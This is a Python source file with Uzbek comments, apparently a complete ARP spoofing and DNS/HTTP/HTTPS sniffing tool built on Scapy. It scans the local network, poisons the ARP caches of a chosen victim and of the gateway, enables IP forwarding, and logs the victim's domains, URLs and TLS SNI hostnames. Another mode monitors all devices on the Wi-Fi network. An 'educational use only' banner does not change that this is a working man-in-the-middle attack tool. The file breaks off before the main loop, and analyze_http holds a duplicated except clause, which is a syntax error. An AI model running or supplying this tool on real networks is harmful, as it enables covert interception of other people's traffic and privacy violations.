#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🛡️ ADVANCED ARP SPOOFING & DNS SNIFFER v2.0
🔥 Mukammallashtirilgan versiya - Barcha funksiyalar bilan
"""

import sys
import signal
import threading
import json
import os
import time
import logging
import tempfile
from datetime import datetime
from collections import defaultdict, Counter
from pathlib import Path

# Scapy imports
from scapy.all import (
    ARP, Ether, ICMP, IP, UDP, TCP, DNS, DNSQR, DNSRR,
    conf, get_if_hwaddr, get_if_addr,
    srp, sendp, sniff, Raw
)

import socket
import subprocess
import platform

# Colorama for cross-platform colored output
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False
    # Fallback: bo'sh string'lar
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ""
    class Back:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ""
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ""

# Scapy verbosity o'chirish
conf.verb = 0

# Konstanta
VERSION = "2.0"
BANNER = f"""
╔══════════════════════════════════════════════════════════════════╗
║  {Fore.CYAN}🛡️  ADVANCED ARP SPOOFING & DNS SNIFFER v{VERSION}{Fore.RESET}              ║
║  {Fore.YELLOW}⚡ Mukammallashtirilgan Network Security Tool{Fore.RESET}              ║
║  {Fore.RED}⚠️  FAQAT O'QUV MAQSADIDA ISHLATILSIN!{Fore.RESET}                      ║
╚══════════════════════════════════════════════════════════════════╝
"""


class Logger:
    """Mukammal logging tizimi"""
    
    def __init__(self, log_dir="logs"):
        self.log_dir = Path(log_dir)
        try:
            self.log_dir.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            print(f"⚠️  Log katalogini yaratishda xato: {e}")
            self.log_dir = Path(tempfile.gettempdir())
            print(f"⚠️  Loglar vaqtinchalik katalogga yoziladi: {self.log_dir}")
        
        # Har xil log fayllari
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # DNS log
        self.dns_log = self.log_dir / f"dns_{timestamp}.log"
        self.dns_json = self.log_dir / f"dns_{timestamp}.json"
        
        # Packet log
        self.packet_log = self.log_dir / f"packets_{timestamp}.log"
        
        # Main log
        self.main_log = self.log_dir / f"main_{timestamp}.log"
        
        # Setup logging handlers
        handlers = [logging.StreamHandler()]
        try:
            handlers.insert(0, logging.FileHandler(self.main_log))
        except Exception as e:
            print(f"⚠️  Log faylini ochishda xato: {e}")
            self.log_dir = Path(tempfile.gettempdir())
            self.dns_log = self.log_dir / f"dns_{timestamp}.log"
            self.dns_json = self.log_dir / f"dns_{timestamp}.json"
            self.packet_log = self.log_dir / f"packets_{timestamp}.log"
            self.main_log = self.log_dir / f"main_{timestamp}.log"
            try:
                handlers.insert(0, logging.FileHandler(self.main_log))
            except Exception:
                pass
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=handlers
        )
        
        self.logger = logging.getLogger(__name__)
        self.dns_data = []
        self.packet_data = []
    
    def log_dns(self, domain, query_type="A", timestamp=None):
        """DNS so'rovini log qilish"""
        if timestamp is None:
            timestamp = datetime.now().isoformat()
        
        entry = {
            "timestamp": timestamp,
            "domain": domain,
            "type": query_type
        }
        
        self.dns_data.append(entry)
        
        # Faylga yozish
        with open(self.dns_log, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {query_type} -> {domain}\n")
    
    def log_packet(self, packet_info):
        """Packet ma'lumotlarini log qilish"""
        self.packet_data.append(packet_info)
        
        with open(self.packet_log, 'a', encoding='utf-8') as f:
            f.write(f"{json.dumps(packet_info)}\n")
    
    def save_json(self):
        """JSON formatda saqlash"""
        with open(self.dns_json, 'w', encoding='utf-8') as f:
            json.dump(self.dns_data, f, indent=2, ensure_ascii=False)
    
    def info(self, msg):
        self.logger.info(msg)
    
    def warning(self, msg):
        self.logger.warning(msg)
    
    def error(self, msg):
        self.logger.error(msg)


class NetworkScanner:
    """Tarmoq skanerlash moduli"""
    
    def __init__(self, interface, logger):
        self.interface = interface
        self.logger = logger
        self.devices = []
    
    def resolve_hostname(self, ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return None
    
    def scan(self, network=None, timeout=3, quiet=False):
        """Tarmoqni skanerlash"""
        try:
            if network is None:
                local_ip = get_if_addr(self.interface)
                network = ".".join(local_ip.split(".")[:3]) + ".0/24"
            
            if not quiet:
                print(f"\n{Fore.CYAN}📡 Skanerlash: {network}{Fore.RESET}")
                print(f"{Fore.YELLOW}⏳ Kutilmoqda...{Fore.RESET}\n")
            
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)
            answered, _ = srp(
                arp_request,
                iface=self.interface,
                timeout=timeout,
                verbose=False,
                retry=2
            )
            
            self.devices = []
            local_ip = get_if_addr(self.interface)
            
            if not quiet:
                print(f"{'IP Manzil':<18} {'MAC Manzil':<20} {'Vendor'}")
                print("-" * 60)
            
            for sent, received in answered:
                if received.psrc != local_ip:
                    vendor = self.get_vendor(received.hwsrc)
                    hostname = self.resolve_hostname(received.psrc)
                    name = hostname if hostname else vendor
                    if not name:
                        name = "Unknown"
                    device = {
                        "ip": received.psrc,
                        "mac": received.hwsrc,
                        "vendor": vendor,
                        "name": name
                    }
                    self.devices.append(device)
                    
                    if not quiet:
                        print(f"{Fore.GREEN}{device['ip']:<18} {device['mac']:<20} {device['name']}{Fore.RESET}")
            
            if not quiet:
                print(f"\n{Fore.CYAN}📊 Jami: {len(self.devices)} ta qurilma topildi{Fore.RESET}")
            
            return self.devices
            
        except Exception as e:
            self.logger.error(f"Skanerlash xatosi: {e}")
            return []
    
    def get_vendor(self, mac):
        """MAC manzil bo'yicha vendor aniqlash"""
        try:
            oui_db = {
                "00:50:56": "VMware",
                "08:00:27": "VirtualBox",
                "52:54:00": "QEMU",
                "00:0C:29": "VMware",
                "B8:27:EB": "Raspberry Pi",
                "DC:A6:32": "Raspberry Pi",
                "F8:1A:67": "Apple",
                "A4:5E:60": "Samsung",
                "3C:15:C2": "Apple",
                "FC:DB:B3": "Apple",
                "D4:6D:6D": "Xiaomi",
                "4C:EB:48": "Xiaomi",
                "28:6D:97": "Sony",
                "A8:5C:2A": "OnePlus",
                "F0:27:65": "Realme",
                "D0:73:D5": "Huawei",
                "64:5A:04": "Huawei",
                "18:3A:0C": "Google",
                "C8:2A:14": "Xiaomi",
                "30:14:09": "Apple",
                "44:65:0D": "Amazon",
            }
            prefix = mac[:8].upper().replace('-', ':')
            return oui_db.get(prefix, "Unknown")
        except:
            return "Unknown"


class ARPSpoofer:
    """ARP Spoofing moduli"""
    
    def __init__(self, interface, logger):
        self.interface = interface
        self.logger = logger
        self.our_mac = get_if_hwaddr(interface)
        self.running = False
        self.packets_sent = 0
        self.lock = threading.Lock()
    
    def enable_ip_forwarding(self):
        """IP forwarding yoqish"""
        try:
            system = platform.system()
            
            if system == "Linux":
                # Linux
                subprocess.run(
                    ["sysctl", "-w", "net.ipv4.ip_forward=1"],
                    capture_output=True
                )
                self.logger.info("✅ IP forwarding yoqildi (Linux)")
                
            elif system == "Darwin":
                # macOS
                subprocess.run(
                    ["sysctl", "-w", "net.inet.ip.forwarding=1"],
                    capture_output=True
                )
                self.logger.info("✅ IP forwarding yoqildi (macOS)")
                
            elif system == "Windows":
                # Windows
                subprocess.run(
                    ["netsh", "interface", "ipv4", "set", "interface",
                     self.interface, "forwarding=enabled"],
                    capture_output=True
                )
                self.logger.info("✅ IP forwarding yoqildi (Windows)")
                
        except Exception as e:
            self.logger.warning(f"IP forwarding yoqishda xato: {e}")
    
    def disable_ip_forwarding(self):
        """IP forwarding o'chirish"""
        try:
            system = platform.system()
            
            if system == "Linux":
                subprocess.run(
                    ["sysctl", "-w", "net.ipv4.ip_forward=0"],
                    capture_output=True
                )
            elif system == "Darwin":
                subprocess.run(
                    ["sysctl", "-w", "net.inet.ip.forwarding=0"],
                    capture_output=True
                )
                
            self.logger.info("✅ IP forwarding o'chirildi")
            
        except Exception as e:
            self.logger.warning(f"IP forwarding o'chirishda xato: {e}")
    
    def get_mac(self, ip):
        """IP bo'yicha MAC topish"""
        try:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            answered, _ = srp(
                arp_request,
                iface=self.interface,
                timeout=2,
                verbose=False,
                retry=1
            )
            
            if answered:
                return answered[0][1].hwsrc
            return None
            
        except:
            return None
    
    def spoof(self, target_ip, target_mac, spoof_ip):
        """ARP spoofing paket yuborish"""
        try:
            packet = Ether(dst=target_mac) / ARP(
                op=2,  # is-at
                pdst=target_ip,
                hwdst=target_mac,
                psrc=spoof_ip,
                hwsrc=self.our_mac
            )
            
            sendp(packet, iface=self.interface, verbose=False)
            
            with self.lock:
                self.packets_sent += 1
                
        except Exception as e:
            self.logger.error(f"Spoofing xatosi: {e}")
    
    def restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """ARP ni asl holatiga qaytarish"""
        try:
            # Target uchun
            packet_target = Ether(dst=target_mac) / ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=gateway_ip,
                hwsrc=gateway_mac
            )
            
            # Gateway uchun
            packet_gateway = Ether(dst=gateway_mac) / ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=target_ip,
                hwsrc=target_mac
            )
            
            # Ko'p marta yuborish
            for _ in range(5):
                sendp(packet_target, iface=self.interface, verbose=False)
                sendp(packet_gateway, iface=self.interface, verbose=False)
                time.sleep(0.1)
                
            self.logger.info("✅ ARP qaytarildi")
            
        except Exception as e:
            self.logger.error(f"Restore xatosi: {e}")


class PacketAnalyzer:
    """Paket tahlili moduli"""
    
    def __init__(self, logger):
        self.logger = logger
        self.dns_queries = defaultdict(int)
        self.dns_responses = {}
        self.http_requests = []
        self.https_connections = []
        self.site_visits = Counter()
        self.device_hosts = defaultdict(Counter)
        self.packet_stats = Counter()
        self.lock = threading.Lock()
    
    def analyze_dns(self, packet):
        """DNS paketni tahlil qilish"""
        try:
            dns = packet[DNS]
            
            # DNS Query
            if dns.qr == 0 and dns.qdcount > 0:
                if DNSQR in packet:
                    qname = packet[DNSQR].qname
                    qtype = packet[DNSQR].qtype
                    
                    if isinstance(qname, bytes):
                        domain = qname.decode('utf-8', errors='ignore').rstrip('.')
                    else:
                        domain = str(qname).rstrip('.')
                    
                    if domain:
                        with self.lock:
                            self.dns_queries[domain] += 1
                        
                        # Query type nomi
                        qtype_names = {
                            1: "A", 2: "NS", 5: "CNAME", 6: "SOA",
                            12: "PTR", 15: "MX", 16: "TXT", 28: "AAAA"
                        }
                        qtype_name = qtype_names.get(qtype, f"TYPE{qtype}")
                        
                        timestamp = datetime.now().strftime("%H:%M:%S")
                        print(f"{Fore.GREEN}🌐 [{timestamp}] {qtype_name:5} -> {domain}{Fore.RESET}")
                        
                        # Log qilish
                        self.logger.log_dns(domain, qtype_name, timestamp)
                        
                        return domain, qtype_name
            
            # DNS Response
            elif dns.qr == 1 and dns.ancount > 0:
                if DNSQR in packet:
                    qname = packet[DNSQR].qname
                    if isinstance(qname, bytes):
                        domain = qname.decode('utf-8', errors='ignore').rstrip('.')
                    else:
                        domain = str(qname).rstrip('.')
                    
                    # Javoblarni saqlash
                    answers = []
                    for i in range(dns.ancount):
                        if packet.haslayer(DNSRR):
                            dnsrr = packet[DNSRR]
                            if dnsrr.type == 1:  # A record
                                answers.append(dnsrr.rdata)
                    
                    if answers:
                        with self.lock:
                            self.dns_responses[domain] = answers
                        
                        print(f"{Fore.CYAN}📥 Javob: {domain} -> {', '.join(answers)}{Fore.RESET}")
        
        except Exception as e:
            pass
    
    def analyze_http(self, packet):
        """HTTP paketni tahlil qilish"""
        try:
            if packet.haslayer(Raw):
                payload = packet[Raw].load
                
                if b"GET " in payload or b"POST " in payload:
                    lines = payload.split(b"\r\n")
                    request_line = lines[0].decode('utf-8', errors='ignore') if lines else ""
                    host = None
                    path = None

                    for line in lines:
                        if line.startswith(b"Host:"):
                            host = line.split(b"Host:")[1].strip().decode('utf-8', errors='ignore')
                            break

                    if not host and request_line:
                        parts = request_line.split()
                        if len(parts) >= 2 and parts[1].startswith("http"):
                            try:
                                host = parts[1].split("//", 1)[1].split("/", 1)[0]
                            except Exception:
                                host = None

                    if request_line:
                        parts = request_line.split()
                        if len(parts) >= 2:
                            path = parts[1]

                    if host:
                        url = f"http://{host}{path if path and path.startswith('/') else ''}"
                    else:
                        url = request_line

                    src_ip = packet[IP].src
                    src_mac = packet[Ether].src if Ether in packet else "N/A"
                    dst_ip = packet[IP].dst
                    dst_label = host or dst_ip

                    with self.lock:
                        self.http_requests.append({
                            "timestamp": datetime.now().isoformat(),
                            "src_ip": src_ip,
                            "src_mac": src_mac,
                            "dst_ip": dst_ip,
                            "host": host or dst_ip,
                            "request": request_line,
                            "url": url
                        })
                        if host:
                            self.site_visits[host] += 1
                            self.device_hosts[src_ip][host] += 1
                        else:
                            self.device_hosts[src_ip][dst_ip] += 1

                    timestamp = datetime.now().strftime("%H:%M:%S")
                    print(f"{Fore.YELLOW}🌍 [{timestamp}] HTTP {src_ip} ({src_mac}) -> {dst_label} {path or ''}{Fore.RESET}")
                    if host:
                        print(f"{Fore.YELLOW}   URL: {url}{Fore.RESET}")
                    return host, url
        except Exception:
            pass
        
        except Exception as e:
            pass
    
    def extract_sni(self, payload):
        try:
            if len(payload) < 5 or payload[0] != 0x16:
                return None
            if len(payload) < 43:
                return None
            if payload[5] != 0x01:
                return None

            pos = 5 + 4  # handshake header
            pos += 2  # version
            pos += 32  # random
            if pos + 1 > len(payload):
                return None

            session_id_len = payload[pos]
            pos += 1 + session_id_len
            if pos + 2 > len(payload):
                return None

            cipher_len = int.from_bytes(payload[pos:pos+2], 'big')
            pos += 2 + cipher_len
            if pos + 1 > len(payload):
                return None

            comp_len = payload[pos]
            pos += 1 + comp_len
            if pos + 2 > len(payload):
                return None

            ext_len = int.from_bytes(payload[pos:pos+2], 'big')
            pos += 2
            end = pos + ext_len

            while pos + 4 <= len(payload) and pos + 4 <= end:
                ext_type = int.from_bytes(payload[pos:pos+2], 'big')
                pos += 2
                ext_data_len = int.from_bytes(payload[pos:pos+2], 'big')
                pos += 2
                if ext_type == 0x00 and pos + ext_data_len <= len(payload):
                    server_name_list_len = int.from_bytes(payload[pos:pos+2], 'big')
                    pos += 2
                    inner_end = pos + server_name_list_len
                    while pos + 3 <= inner_end:
                        name_type = payload[pos]
                        pos += 1
                        name_len = int.from_bytes(payload[pos:pos+2], 'big')
                        pos += 2
                        if name_type == 0 and pos + name_len <= inner_end:
                            return payload[pos:pos+name_len].decode('utf-8', errors='ignore')
                        pos += name_len
                    return None
                pos += ext_data_len
        except Exception:
            return None
        return None

    def analyze_https(self, packet):
        """HTTPS (TLS) paketni tahlil qilish"""
        try:
            if packet[TCP].dport == 443 or packet[TCP].sport == 443:
                if packet.haslayer(Raw):
                    payload = packet[Raw].load
                    sni = self.extract_sni(payload)
                    if sni:
                        src_ip = packet[IP].src
                        src_mac = packet[Ether].src if Ether in packet else "N/A"
                        dst_ip = packet[IP].dst
                        with self.lock:
                            self.https_connections.append({
                                "timestamp": datetime.now().isoformat(),
                                "src_ip": src_ip,
                                "src_mac": src_mac,
                                "dst_ip": dst_ip,
                                "host": sni,
                                "dst_port": packet[TCP].dport
                            })
                            self.site_visits[sni] += 1
                            self.device_hosts[src_ip][sni] += 1

                        timestamp = datetime.now().strftime("%H:%M:%S")
                        print(f"{Fore.MAGENTA}🔐 [{timestamp}] HTTPS SNI: {src_ip} ({src_mac}) -> {sni}{Fore.RESET}")
                        return sni
        except Exception:
            pass
        return None
    
    def get_statistics(self):
        """Statistikani olish"""
        with self.lock:
            return {
                "dns_queries": dict(self.dns_queries),
                "dns_responses": dict(self.dns_responses),
                "http_requests": list(self.http_requests),
                "https_connections": list(self.https_connections),
                "site_visits": dict(self.site_visits),
                "device_hosts": {ip: dict(hosts) for ip, hosts in self.device_hosts.items()},
                "packet_stats": dict(self.packet_stats)
            }


class AdvancedSniffer:
    """Mukammal ARP Spoofing va DNS Sniffer"""
    
    def __init__(self):
        self.logger = Logger()
        self.interface = None
        self.target_ip = None
        self.target_mac = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.network = None
        self.devices = []
        
        self.scanner = None
        self.spoofer = None
        self.analyzer = PacketAnalyzer(self.logger)
        
        self.running = False
        self.start_time = None
        
        # Threads
        self.spoof_thread = None
        self.sniff_thread = None
        self.stats_thread = None
        self.device_scan_thread = None
    
    def print_banner(self):
        """Banner chop etish"""
        print(BANNER)
    
    def select_interface(self):
        """Interface tanlash"""
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"🔧 TARMOQ INTERFEYSINI TANLANG")
        print(f"{'='*70}{Fore.RESET}")
        
        interfaces = self.get_interfaces()
        
        if not interfaces:
            print(f"{Fore.RED}❌ Interfeys topilmadi!{Fore.RESET}")
            manual = input(f"{Fore.YELLOW}Interfeys nomi kiriting: {Fore.RESET}").strip()
            if manual:
                self.interface = manual
                return True
            return False
        
        print(f"\n{Fore.CYAN}📋 Mavjud interfeyslar:{Fore.RESET}")
        for idx, iface in enumerate(interfaces, 1):
            try:
                ip = get_if_addr(iface)
                mac = get_if_hwaddr(iface)
                print(f"  {idx}. {Fore.GREEN}{iface:<15} {Fore.YELLOW}IP: {ip:<15} MAC: {mac}{Fore.RESET}")
            except:
                print(f"  {idx}. {iface}")
        
        choice = input(f"\n{Fore.YELLOW}Tanlang (1-{len(interfaces)}): {Fore.RESET}").strip()
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(interfaces):
                self.interface = interfaces[idx]
                print(f"{Fore.GREEN}✅ Tanlandi: {self.interface}{Fore.RESET}")
                return True
        except:
            pass
        
        print(f"{Fore.RED}❌ Noto'g'ri tanlov!{Fore.RESET}")
        return False
    
    def get_interfaces(self):
        """Interfeyslarni olish"""
        interfaces = []
        
        try:
            system = platform.system()
            
            if system in ["Linux", "Darwin"]:
                result = subprocess.run(
                    ["ip", "link", "show"] if system == "Linux" else ["ifconfig"],
                    capture_output=True, text=True, timeout=2
                )
                
                for line in result.stdout.split('\n'):
                    if system == "Linux":
                        if ':' in line and not line.startswith(' '):
                            iface = line.split(':')[1].strip()
                            if iface not in ['lo']:
                                interfaces.append(iface)
                    else:
                        if line and not line.startswith(' ') and ':' in line:
                            iface = line.split(':')[0].strip()
                            if iface not in ['lo', 'lo0']:
                                interfaces.append(iface)
            
            else:  # Windows
                # Windows uchun Scapy'ning o'zi
                from scapy.arch.windows import get_windows_if_list
                win_ifaces = get_windows_if_list()
                for iface in win_ifaces:
                    if iface.get('name'):
                        interfaces.append(iface['name'])
        
        except Exception as e:
            self.logger.error(f"Interface olishda xato: {e}")
        
        return interfaces
    
    def get_network(self):
        """Local tarmoq prefiksini aniqlash"""
        try:
            local_ip = get_if_addr(self.interface)
            return ".".join(local_ip.split(".")[:3]) + ".0/24"
        except Exception:
            return None

    def scan_network(self, quiet=False):
        """Tarmoqni skanerlash"""
        self.scanner = NetworkScanner(self.interface, self.logger)
        self.network = self.get_network()
        self.devices = self.scanner.scan(self.network, quiet=quiet)
        return self.devices
    
    def select_target(self, devices):
        """Target tanlash"""
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"🎯 NISHON QURILMANI TANLANG")
        print(f"{'='*70}{Fore.RESET}")
        
        # Gateway aniqlash
        self.gateway_ip = self.get_gateway()
        print(f"\n{Fore.YELLOW}📍 Gateway: {self.gateway_ip}{Fore.RESET}")
        
        print(f"\n{Fore.CYAN}📋 Qurilmalar:{Fore.RESET}")
        for idx, device in enumerate(devices, 1):
            name_display = device.get('name') or device.get('vendor') or 'Unknown'
            print(f"  {idx}. {Fore.GREEN}{device['ip']:<18} {device['mac']:<20} {name_display}{Fore.RESET}")
        
        choice = input(f"\n{Fore.YELLOW}Tanlang (1-{len(devices)}): {Fore.RESET}").strip()
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(devices):
                self.target_ip = devices[idx]['ip']
                self.target_mac = devices[idx]['mac']
                
                # Gateway MAC
                self.spoofer = ARPSpoofer(self.interface, self.logger)
                self.gateway_mac = self.spoofer.get_mac(self.gateway_ip)
                
                if not self.gateway_mac:
                    print(f"{Fore.RED}❌ Gateway MAC topilmadi!{Fore.RESET}")
                    return False
                
                print(f"\n{Fore.GREEN}✅ Nishon:{Fore.RESET}")
                print(f"   IP: {self.target_ip}")
                print(f"   MAC: {self.target_mac}")
                print(f"   Gateway: {self.gateway_ip} ({self.gateway_mac})")
                
                return True
        except:
            pass
        
        print(f"{Fore.RED}❌ Noto'g'ri tanlov!{Fore.RESET}")
        return False
    
    def get_gateway(self):
        """Gateway IP aniqlash"""
        try:
            system = platform.system()
            
            if system == "Linux":
                result = subprocess.run(
                    ["ip", "route"],
                    capture_output=True, text=True
                )
                for line in result.stdout.split('\n'):
                    if "default via" in line:
                        return line.split()[2]
            
            elif system == "Darwin":
                result = subprocess.run(
                    ["route", "-n", "get", "default"],
                    capture_output=True, text=True
                )
                for line in result.stdout.split('\n'):
                    if "gateway:" in line:
                        return line.split()[-1]
            
            elif system == "Windows":
                result = subprocess.run(
                    ["ipconfig"],
                    capture_output=True, text=True
                )
                for line in result.stdout.split('\n'):
                    if "Default Gateway" in line or "Standart Shlyuz" in line:
                        parts = line.split(':')
                        if len(parts) > 1:
                            gateway = parts[-1].strip()
                            if gateway:
                                return gateway
        
        except:
            pass
        
        return "192.168.1.1"
    
    def spoof_process(self):
        """ARP spoofing jarayoni"""
        print(f"\n{Fore.CYAN}🚀 ARP SPOOFING BOSHLANDI{Fore.RESET}")
        
        while self.running:
            try:
                # Target'ga Gateway sifatida o'zimizni ko'rsatamiz
                self.spoofer.spoof(
                    self.target_ip,
                    self.target_mac,
                    self.gateway_ip
                )
                
                # Gateway'ga Target sifatida o'zimizni ko'rsatamiz
                self.spoofer.spoof(
                    self.gateway_ip,
                    self.gateway_mac,
                    self.target_ip
                )
                
                time.sleep(1)
                
            except Exception as e:
                self.logger.error(f"Spoofing xatosi: {e}")
                break
    
    def packet_callback(self, packet):
        """Paketlarni qayta ishlash"""
        try:
            if IP in packet:
                # DNS paketlar
                if DNS in packet:
                    self.analyzer.analyze_dns(packet)

                # HTTP paketlar
                if TCP in packet and (packet[TCP].dport == 80 or packet[TCP].sport == 80):
                    self.analyzer.analyze_http(packet)

                # HTTPS paketlar
                if TCP in packet and (packet[TCP].dport == 443 or packet[TCP].sport == 443):
                    self.analyzer.analyze_https(packet)
        except Exception:
            pass

    def sniff_process(self):
        """Sniffing jarayoni"""
        print(f"{Fore.CYAN}📊 PACKET SNIFFING BOSHLANDI{Fore.RESET}\n")
        
        try:
            packet_filter = f"net {self.network} and (tcp port 80 or tcp port 443 or udp port 53)" if self.network else f"host {self.target_ip} and (tcp port 80 or tcp port 443 or udp port 53)"
            sniff(
                iface=self.interface,
                prn=self.packet_callback,
                filter=packet_filter,
                store=False,
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            self.logger.error(f"Sniffing xatosi: {e}")
    
    def stats_display(self):
        """Real-time statistika ko'rsatish"""
        while self.running:
            time.sleep(5)
            
            if self.scanner and self.network:
                self.devices = self.scanner.scan(self.network, timeout=2, quiet=True)

            elapsed = time.time() - self.start_time
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)
            
            stats = self.analyzer.get_statistics()
            
            print(f"\n{Fore.MAGENTA}{'='*70}")
            print(f"📊 REAL-TIME STATISTIKA")
            print(f"{'='*70}{Fore.RESET}")
            print(f"⏱️  Vaqt: {hours:02d}:{minutes:02d}:{seconds:02d}")
            print(f"📤 ARP paketlar: {self.spoofer.packets_sent}")
            print(f"🌐 DNS so'rovlar: {len(stats['dns_queries'])}")
            print(f"🌍 HTTP so'rovlar: {len(stats['http_requests'])}")
            print(f"🔒 HTTPS ulanishlar: {len(stats['https_connections'])}")
            
            if self.devices:
                print(f"\n{Fore.BLUE}📶 Tarmoqdagi qurilmalar:{Fore.RESET}")
                for device in self.devices[:8]:
                    device_name = device.get('name') or device.get('vendor') or 'Unknown'
                    print(f"  {device['ip']:<16} {device['mac']:<20} {device_name}")
                if len(self.devices) > 8:
                    print(f"  ... +{len(self.devices)-8} ta boshqa qurilma")

            if stats['site_visits']:
                print(f"\n{Fore.CYAN}🔝 Top 5 Saytlar:{Fore.RESET}")
                top_sites = sorted(
                    stats['site_visits'].items(),
                    key=lambda x: x[1],
                    reverse=True
                )[:5]
                for idx, (site, count) in enumerate(top_sites, 1):
                    print(f"  {idx}. {site} ({count} marta)")

            if stats['device_hosts']:
                print(f"\n{Fore.GREEN}🧑‍💻 Qurilma bo'yicha saytlar:{Fore.RESET}")
                for src_ip, hosts in list(stats['device_hosts'].items())[:5]:
                    top_sites = ", ".join(f"{host}({count})" for host, count in sorted(hosts.items(), key=lambda x: x[1], reverse=True)[:3])
                    print(f"  {src_ip}: {top_sites}")
    
    def signal_handler(self, sig, frame):
        """Ctrl+C signal handler"""
        print(f"\n\n{Fore.YELLOW}⏹️  DASTUR TO'XTATILMOQDA...{Fore.RESET}")
        
        self.running = False
        
        # ARP restore
        if self.spoofer:
            print(f"{Fore.CYAN}🔄 ARP jadval qaytarilmoqda...{Fore.RESET}")
            self.spoofer.restore(
                self.target_ip, self.target_mac,
                self.gateway_ip, self.gateway_mac
            )
            self.spoofer.disable_ip_forwarding()
        
        # Statistikani saqlash
        self.print_final_statistics()
        self.logger.save_json()
        
        print(f"\n{Fore.GREEN}✅ Barcha ma'lumotlar saqlandi!{Fore.RESET}")
        print(f"{Fore.GREEN}📁 Katalog: {self.logger.log_dir}{Fore.RESET}")
        
        sys.exit(0)
    
    def print_final_statistics(self):
        """Yakuniy statistika"""
        stats = self.analyzer.get_statistics()
        
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"📈 YAKUNIY STATISTIKA")
        print(f"{'='*70}{Fore.RESET}")
        
        elapsed = time.time() - self.start_time
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        
        print(f"⏱️  Umumiy vaqt: {hours:02d}:{minutes:02d}:{seconds:02d}")
        print(f"📤 Yuborilgan ARP paketlar: {self.spoofer.packets_sent}")
        print(f"🌐 Jami DNS so'rovlar: {len(stats['dns_queries'])}")
        print(f"🌍 Jami HTTP so'rovlar: {len(stats['http_requests'])}")
        print(f"🔒 Jami HTTPS ulanishlar: {len(stats['https_connections'])}")
        
        # Barcha domenlar
        if stats['dns_queries']:
            print(f"\n{Fore.GREEN}🌐 Barcha domenlar:{Fore.RESET}")
            sorted_domains = sorted(
                stats['dns_queries'].items(),
                key=lambda x: x[1],
                reverse=True
            )
            
            for idx, (domain, count) in enumerate(sorted_domains, 1):
                print(f"  {idx:3d}. {domain:50} ({count} marta)")
        
        # DNS javoblar
        if stats['dns_responses']:
            print(f"\n{Fore.CYAN}📥 DNS Javoblar:{Fore.RESET}")
            for domain, ips in list(stats['dns_responses'].items())[:10]:
                print(f"  {domain} -> {', '.join(ips)}")

        if stats['site_visits']:
            print(f"\n{Fore.BLUE}🌐 Eng ko'p kirilgan saytlar:{Fore.RESET}")
            for idx, (site, count) in enumerate(sorted(stats['site_visits'].items(), key=lambda x: x[1], reverse=True)[:10], 1):
                print(f"  {idx}. {site} ({count} marta)")
        
        # HTTP so'rovlar
        if stats['http_requests']:
            print(f"\n{Fore.YELLOW}🌍 HTTP So'rovlar:{Fore.RESET}")
            for idx, req in enumerate(stats['http_requests'][:10], 1):
                print(f"  {idx}. {req['host']} - {req['request'][:50]}")
    
    def run(self):
        """Asosiy dastur"""
        self.print_banner()
        
        # Signal handler
        signal.signal(signal.SIGINT, self.signal_handler)
        
        # 1. Interface tanlash
        if not self.select_interface():
            sys.exit(1)
        
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"📌 MODE TANLANG")
        print(f"{'='*70}{Fore.RESET}")
        print(f"  1. Maqsadli qurilmani ARP spoofing orqali kuzatish")
        print(f"  2. Wi-Fi tarmog'iga ulangan barcha qurilmalarni real vaqt kuzatish")
        choice = input(f"\n{Fore.YELLOW}Tanlovingiz (1 yoki 2): {Fore.RESET}").strip()

        if choice not in ["1", "2"]:
            print(f"{Fore.RED}❌ Noto'g'ri tanlov!{Fore.RESET}")
            sys.exit(1)

        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"🔍 TARMOQ SKANERLASHI")
        print(f"{'='*70}{Fore.RESET}")
        
        devices = self.scan_network(quiet=(choice == "2"))
        if not devices:
            print(f"{Fore.RED}❌ Qurilmalar topilmadi!{Fore.RESET}")
            sys.exit(1)

        if choice == "2":
            print(f"\n{Fore.GREEN}📶 Wi-Fi tarmog'iga ulangan barcha qurilmalar real vaqt kuzatilmoqda...{Fore.RESET}")
            self.running = True
            self.start_time = time.time()

            self.sniff_thread = threading.Thread(
                target=self.sniff_process,
                daemon=True
            )
            self.stats_thread = threading.Thread(
                target=self.stats_display,
                daemon=True
            )

            self.sniff_thread.start()
            self.stats_thread.start()

            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.signal_handler(None, None)
            return

        # 3. Target tanlash
        if not self.select_target(devices):
            sys.exit(1)
        
        # 4. IP forwarding yoqish
        self.spoofer.enable_ip_forwarding()
        
        # 5. Threadlarni boshlash
        print(f"\n{Fore.GREEN}{'='*70}")
        print(f"🚀 HUJUM BOSHLANMOQDA...")
        print(f"{'='*70}{Fore.RESET}")
        print(f"{Fore.YELLOW}⚠️  To'xtatish uchun Ctrl+C bosing{Fore.RESET}\n")
        
        self.running = True
        self.start_time = time.time()
        
